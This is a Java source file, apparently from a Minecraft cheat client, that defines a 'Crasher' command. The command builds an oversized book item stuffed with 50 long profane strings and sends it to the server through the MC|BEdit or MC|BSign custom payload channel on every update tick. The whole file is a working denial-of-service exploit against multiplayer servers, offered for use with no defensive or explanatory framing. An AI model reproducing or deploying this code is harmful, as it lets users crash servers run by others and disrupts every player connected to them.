package me.slowly.client.util.command.cmds;

import net.minecraft.client.Minecraft;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C02PacketUseEntity;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C07PacketPlayerDigging;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;
import me.slowly.client.events.UpdateEvent;
import me.slowly.client.ui.notifiactions.ClientNotification;
import me.slowly.client.util.ClientUtil;
import me.slowly.client.util.TimeHelper;
import me.slowly.client.util.command.Command;
import java.util.Objects;
import java.util.Random;

import com.darkmagician6.eventapi.EventTarget;

import io.netty.buffer.Unpooled;

public class CommandCrasher extends Command {
	public CommandCrasher(String[] commands) {
		super(commands);
		this.setArgs("Crash :)");
	}

	public static Random rand = new Random();
	static Minecraft mc = Minecraft.getMinecraft();

	@EventTarget
	public void onUpdate(UpdateEvent e) {
		sendCrashPacket();			 
		ClientUtil.sendClientMessage("Preparing to Crash", ClientNotification.Type.INFO);
	}
	
	public static void sendCrashPacket() {
		ClientUtil.sendClientMessage("Crashing", ClientNotification.Type.WARNING);
		        try {
                            
		            final ItemStack bookObj = new ItemStack(Items.writable_book);
		            final NBTTagCompound base = new NBTTagCompound();
		            final NBTTagList list = new NBTTagList();
		            final String interestingstring = "fuckoffuyfuckingshitfuckingyoufuckingshiterveryourshitfuckoffyourshitezfuckingserveryourshitfuckingserverisbyfuckingshitfuckingyoufuckingshitfuckingserverisbyfuckingshitfuckingyoufuckingshitfyourshitezfuckingsfuckoffyourshitezfuckingserveryourshitfuckingserverisbyfuckingshitfuckingyoufuckingshiterveryourshitfuckoffyours";
		            for (int j = 0; j < 50; j++) {
		            	list.appendTag(new NBTTagString(interestingstring));
		            }
		            base.setTag("pages", list);
		            base.setString("author", "PANDAAAAAAAA" + Math.random() * 500.0);
		            base.setByte("resolved", (byte)1);
		            base.setString("title", "TERRIRBLEEEEE" + Math.random() * 500.0);
		            bookObj.setTagCompound(base);
		            String channel = "MC|BEdit";
		            if (rand.nextBoolean()) {
		                channel = "MC|BSign";
		            }
		            final PacketBuffer bomb = new PacketBuffer(Unpooled.buffer());
		            bomb.writeItemStackToBuffer(bookObj);
		            mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload(channel, bomb));
		        }
		        catch (Exception ex) {}
		    }
}